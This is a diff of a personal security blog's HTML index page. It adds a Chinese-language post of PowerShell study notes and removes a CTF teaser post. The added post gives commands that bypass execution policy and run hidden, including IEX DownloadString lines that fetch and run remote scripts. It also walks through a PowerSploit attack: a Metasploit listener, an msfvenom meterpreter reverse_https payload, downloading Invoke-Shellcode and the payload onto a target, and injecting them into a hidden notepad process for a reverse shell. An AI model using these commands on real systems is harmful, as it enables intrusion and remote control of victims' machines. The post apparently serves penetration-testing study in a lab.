@@ -255,6 +255,212 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/10/PowerShell学习全记录.html/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="狗蛋菌">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Goudan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/10/PowerShell学习全记录.html/" itemprop="url">PowerShell学习全记录</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-10T09:56:23+08:00">
+                2021-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  283 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h1><h2 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h2><table>
+<thead>
+<tr>
+<th align="center">策略</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Restricted</td>
+<td align="center">脚本不能运行</td>
+</tr>
+<tr>
+<td align="center">AllSigned</td>
+<td align="center">仅当脚本由受信任的发布者签名时才能运行</td>
+</tr>
+<tr>
+<td align="center">RemoteSigned</td>
+<td align="center">本地创建的脚本可以运行，但从网上下的不能运行</td>
+</tr>
+<tr>
+<td align="center">Unrestricted</td>
+<td align="center">允许所有的script运行</td>
+</tr>
+</tbody></table>
+<p>查看策略</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br></pre></td></tr></table></figure>
+
+<p>设置策略</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;策略&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过powershell的执行策略"><a href="#绕过powershell的执行策略" class="headerlink" title="绕过powershell的执行策略"></a>绕过powershell的执行策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绕过本地权限执行</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -File xxx.ps1</span><br><span class="line"><span class="comment">#本地隐藏绕过权限执行脚本</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File xxx.ps1</span><br><span class="line"><span class="comment">#用IEX下载远程PS1脚本绕过权限执行</span></span><br><span class="line">powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[parameters]</span><br></pre></td></tr></table></figure>
+
+<h1 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h1><p><img src="https://i.loli.net/2021/03/10/HtRshvr8z32Mqmp.png" alt="image-20210310102318531"></p>
+<h2 id="powersploit实战（进程注入反弹shell）"><a href="#powersploit实战（进程注入反弹shell）" class="headerlink" title="powersploit实战（进程注入反弹shell）"></a>powersploit实战（进程注入反弹shell）</h2><ol>
+<li><p>MSF中设置监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/03/10/PGA1RtC6njxUdp7.png" alt="image-20210310113150127"></p>
+</li>
+<li><p>使用 msfvenom 生成一个 powershell 脚本木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.239.134 LPORT=4444 -f powershell -o /var/www/html/test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/03/10/iNmq8tkLpY3fJb9.png" alt="image-20210310113211491"></p>
+</li>
+<li><p>目标机下载 invoke-shellcode 和 木马</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/powersploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/test"</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="4">
+<li>创建一个新的进程进行注入</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line">Invoke-Shellcode -ProcessID <span class="number">2816</span> -Shellcode (<span class="variable">$buf</span>) -Force</span><br></pre></td></tr></table></figure>
+
+<h1 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h1><h1 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h1>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/08/内网学习记录.html/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1644,161 +1850,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/01/17/GWCTF-2019-枯燥的抽奖.html/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="狗蛋菌">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Goudan's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/01/17/GWCTF-2019-枯燥的抽奖.html/" itemprop="url">[GWCTF 2019]枯燥的抽奖</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-17T20:23:07+08:00">
-                2021-01-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  253 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>考点：php伪随机数</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2021/01/17/GWCTF-2019-枯燥的抽奖.html/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1849,7 +1900,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
